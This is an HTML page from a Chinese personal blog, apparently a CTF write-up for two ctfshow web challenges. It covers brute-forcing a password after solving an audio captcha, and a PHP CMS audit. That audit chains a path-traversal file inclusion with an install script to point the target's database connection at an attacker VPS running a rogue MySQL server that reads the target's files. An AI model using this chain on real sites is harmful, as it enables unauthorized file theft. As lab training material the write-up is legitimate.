@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="baby_captcha听出验证码然后直接抓包爆破密码即可 ctfshowcmsphp代码审计。首先看&#x2F;index.php中，存在文件包含。 12345678$want &#x3D; addslashes($_GET[&amp;#x27;feng&amp;#x27;]);$want &#x3D; $want&#x3D;&#x3D;&quot;&quot;?&quot;index&quot;:$want;include(&amp;#x27;files&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-web-baby杯笔记">
+<meta property="og:url" content="http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="ShuiChang厕纸博客站">
+<meta property="og:description" content="baby_captcha听出验证码然后直接抓包爆破密码即可 ctfshowcmsphp代码审计。首先看&#x2F;index.php中，存在文件包含。 12345678$want &#x3D; addslashes($_GET[&amp;#x27;feng&amp;#x27;]);$want &#x3D; $want&#x3D;&#x3D;&quot;&quot;?&quot;index&quot;:$want;include(&amp;#x27;files&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-10-03T09:16:19.000Z">
+<meta property="article:modified_time" content="2023-10-03T09:16:42.025Z">
+<meta property="article:author" content="ShuiChang">
+<meta property="article:tag" content="web学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow-web-baby杯笔记</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/10/03/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-iDev-Enhancing-Social-Coding-Security-by-Cross-platform-User-Identification-Between-GitHub-and-Stack-Overflow/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/02/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&text=ctfshow-web-baby杯笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&title=ctfshow-web-baby杯笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&is_video=false&description=ctfshow-web-baby杯笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web-baby杯笔记&body=Check out this article: http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&title=ctfshow-web-baby杯笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&title=ctfshow-web-baby杯笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&title=ctfshow-web-baby杯笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&title=ctfshow-web-baby杯笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&name=ctfshow-web-baby杯笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&t=ctfshow-web-baby杯笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-captcha"><span class="toc-number">1.</span> <span class="toc-text">baby_captcha</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshowcms"><span class="toc-number">2.</span> <span class="toc-text">ctfshowcms</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow-web-baby杯笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ShuiChang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-03T09:16:19.000Z" class="dt-published" itemprop="datePublished">2023-10-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web%E5%AD%A6%E4%B9%A0/" rel="tag">web学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="baby-captcha"><a href="#baby-captcha" class="headerlink" title="baby_captcha"></a>baby_captcha</h2><p>听出验证码然后直接抓包爆破密码即可</p>
+<h2 id="ctfshowcms"><a href="#ctfshowcms" class="headerlink" title="ctfshowcms"></a>ctfshowcms</h2><p>php代码审计。首先看&#x2F;index.php中，存在文件包含。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$want</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;feng&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$want</span> = <span class="variable">$want</span>==<span class="string">&quot;&quot;</span>?<span class="string">&quot;index&quot;</span>:<span class="variable">$want</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$want</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后看&#x2F;install&#x2F;index.php。发现这是一个安装数据库的脚本，其中user,password,dbhost,dbuser,dbpwd和dbname都是可控的参数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbhost</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dbhost&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbuser</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dbuser&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbpwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dbpwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dbname&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是直接访问&#x2F;install&#x2F;index.php时，发现回显的直接是“已经安装”，那么就说明该路径下已经有了installLock.txt这个文件。如果要用&#x2F;index.php下的文件包含来绕过的话，那么又缺少了sql文件。</p>
+<p>但是dbhost，dbuser什么的都能控制，那么就可以尝试搭一个恶意服务器读文件。使用从<a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">别的wp</a>那里找到的脚本</p>
+<p>然后post发个包就行，连接到远程的VPS。注意：VPS上需要<a target="_blank" rel="noopener" href="https://blog.csdn.net/YM_1111/article/details/107555383">安装mysql</a>并且设置<a target="_blank" rel="noopener" href="https://blog.csdn.net/wyq232417/article/details/88753365">可以远程访问</a>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> posthttp://0983140c-15be-4f10-9449-5f49d376b5e4.challenge.ctf.show/?feng=../install/index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user=随便填&amp;password=随便填&amp;dbhost=VPS地址和端口&amp;dbuser=VPS数据库用户名&amp;dbpwd=VPS数据库密码&amp;dbname=VPS数据库名，可以自己建一个</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-captcha"><span class="toc-number">1.</span> <span class="toc-text">baby_captcha</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshowcms"><span class="toc-number">2.</span> <span class="toc-text">ctfshowcms</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&text=ctfshow-web-baby杯笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&title=ctfshow-web-baby杯笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&is_video=false&description=ctfshow-web-baby杯笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web-baby杯笔记&body=Check out this article: http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&title=ctfshow-web-baby杯笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&title=ctfshow-web-baby杯笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&title=ctfshow-web-baby杯笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&title=ctfshow-web-baby杯笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&name=ctfshow-web-baby杯笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/03/ctfshow-web-baby%E6%9D%AF%E7%AC%94%E8%AE%B0/&t=ctfshow-web-baby杯笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
